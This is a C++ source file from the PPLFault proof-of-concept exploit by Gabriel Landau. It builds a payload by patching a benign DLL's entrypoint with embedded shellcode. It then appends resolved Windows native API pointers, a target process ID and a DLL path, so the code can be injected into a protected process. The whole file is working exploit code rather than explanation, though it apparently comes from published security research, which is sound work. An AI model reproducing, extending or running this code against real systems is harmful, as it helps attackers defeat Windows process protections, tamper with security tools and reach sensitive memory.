// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include "Payload.h"
#include "utils.h"
#include "resource.h"
#include "..\\InjectShellcode\\InjectShellcode.h"
#include <DbgHelp.h>

#pragma comment(lib, "Dbghelp.lib")

bool InitShellcodeParams(
    PSHELLCODE_PARAMS pParams
)
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
    uint8_t nops[MAGIC_NOPS_LENGTH] = MAGIC_NOPS;

    ZeroMemory(pParams, sizeof(*pParams));

    pParams->magic1 = MAGIC1;
    pParams->magic2 = MAGIC2;

    memcpy(pParams->magicNops, nops, sizeof(nops));

    // IAT
    if (!hNtdll || !hKernel32)
    {
        PrintVerbose(L"Couldn't find kernel32/kernel32?  What?\n");
        return false;
    }

#define REQUIRE_IMPORT(p) if (!(p)) { goto IMPORT_FAILURE; }

    // Target process should already have ntdll and kernel32 loaded, so we can just pass pointers over
    
    // ntdll
    REQUIRE_IMPORT(pParams->pNtOpenProcess = (NtOpenProcess_t)GetProcAddress(hNtdll, "NtOpenProcess"));
    REQUIRE_IMPORT(pParams->pNtTerminateProcess = (NtTerminateProcess_t)GetProcAddress(hNtdll, "NtTerminateProcess"));
    REQUIRE_IMPORT(pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
    REQUIRE_IMPORT(pParams->pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));
    REQUIRE_IMPORT(pParams->pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory"));
    REQUIRE_IMPORT(pParams->pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(hNtdll, "RtlCreateUserThread"));
    REQUIRE_IMPORT(pParams->pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject"));
    REQUIRE_IMPORT(pParams->pNtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hNtdll, "NtSetInformationProcess"));

	// kernel32
    REQUIRE_IMPORT(pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, "LoadLibraryW"));
    REQUIRE_IMPORT(pParams->pGetLastError = (GetLastError_t)GetProcAddress(hKernel32, "GetLastError"));

    return true;

IMPORT_FAILURE:
    PrintVerbose(L"Failed to resolve a payload import\n");
    return false;
}

// Finds the address within buf of the image entrypoint 
PVOID FindEntrypointVA(const std::string& buf)
{
    PVOID pBase = (PVOID)buf.data();
    PIMAGE_NT_HEADERS pNtHeaders = ImageNtHeader(pBase);

    if (NULL == pNtHeaders)
    {
        PrintVerbose(L"FindOffsetOfEntrypoint: ImageNtHeader failed with GLE %u.  Is this a PE file?\n", GetLastError());
        return NULL;
    }

    if (IMAGE_FILE_MACHINE_AMD64 != pNtHeaders->FileHeader.Machine)
    {
        PrintVerbose(L"FindOffsetOfEntrypoint: Only x64 is supported\n");
        return NULL;
    }

    // Map RVA -> VA
    return ImageRvaToVa(pNtHeaders, pBase, pNtHeaders->OptionalHeader.AddressOfEntryPoint, NULL);
}


// Pulls the shellcode out of our resource section and writes to the given pointer
bool WriteShellcode(LPCWSTR lpResourceName, PVOID pBuf, SIZE_T maxLength, DWORD& bytesWritten)
{
    HRSRC hr = NULL;
    HGLOBAL hg = NULL;
    LPVOID pResource = NULL;
    DWORD rSize = 0;

    hr = FindResourceW(NULL, lpResourceName, RT_RCDATA);
    if (!hr)
    {
        PrintVerbose(L"GetShellcode: FindResource failed with GLE %u\n", GetLastError());
        return false;
    }

    hg = LoadResource(NULL, hr);
    if (!hr)
    {
        PrintVerbose(L"GetShellcode: LoadResource failed with GLE %u\n", GetLastError());
        return false;
    }

    pResource = (LPVOID)LockResource(hg);
    if (!pResource)
    {
        PrintVerbose(L"GetShellcode: LockResource failed with GLE %u\n", GetLastError());
        return false;
    }

    rSize = SizeofResource(NULL, hr);
    if (!rSize)
    {
        PrintVerbose(L"GetShellcode: SizeofResource returned 0 and GLE %u\n", GetLastError());
        return false;
    }

    if (rSize > maxLength)
    {
        PrintVerbose(L"GetShellcode: SizeofResource returned 0 and GLE %u\n", GetLastError());
        return false;
    }

    memcpy(pBuf, pResource, rSize);
    bytesWritten = rSize;

    PrintVerbose(L"GetShellcode: %u bytes of shellcode written over DLL entrypoint\n", rSize);

    FreeResource(pResource);

    return true;
}

// Find DLL entrypoint and overwrite it with shellcode
bool BuildPayload(
    HANDLE hBenignDll, 
    std::string & payloadBuffer,
    DWORD dwTargetProcessId,
	LPWSTR pwszDllPath)
{
    std::string buf;
    LARGE_INTEGER dllSize = { 0, };
    DWORD dwBytesRead = 0;
    PCHAR pEntrypoint = NULL;
    DWORD bytesWritten = 0;
    SHELLCODE_PARAMS params = { 0, };
    SIZE_T availableSpace = 0;
    const uint8_t magic[] = MAGIC_NOPS;
    DWORD curOffset = 0;

    // Read entire source file into buffer
    SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
    GetFileSizeEx(hBenignDll, &dllSize);
    buf.resize(dllSize.QuadPart);

    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
        (dwBytesRead != dllSize.QuadPart))
    {
        PrintVerbose(L"BuildPayload: ReadFile failed with GLE %u\n", GetLastError());
        return false;
    }

    pEntrypoint = (PCHAR)FindEntrypointVA(buf);
    if (!pEntrypoint)
    {
        return false;
    }

    availableSpace = &buf[buf.size()] - (char*)pEntrypoint;

    // Write magic NOPs
    memcpy(pEntrypoint, magic, sizeof(magic));
    curOffset += sizeof(magic);

    // Overwrite entrypoint with shellcode embedded in our resource section
    if (!WriteShellcode(MAKEINTRESOURCE(IDR_RCDATA2), pEntrypoint + curOffset, availableSpace, bytesWritten))
    {
        return false;
    }
    curOffset += bytesWritten;

    // Create a SHELLCODE_PARAMS and write it after the shellcode
    if (!InitShellcodeParams(&params))
    {
        return false;
    }

    if (pEntrypoint + curOffset + sizeof(params) > buf.data() + buf.size() - 1)
    {
        PrintVerbose(L"Not enough space for SHELLCODE_PARAMS\n");
        return false;
    }

    params.mySize = curOffset + sizeof(params);
    params.dwPid = dwTargetProcessId;
	wcsncpy(params.dllName, pwszDllPath, wcslen(pwszDllPath)+1);

    PrintVerbose(L"Target PID is %u\n", params.dwPid);

    memcpy((pEntrypoint) + curOffset, &params, sizeof(params));

    payloadBuffer = std::move(buf);

    return true;
}
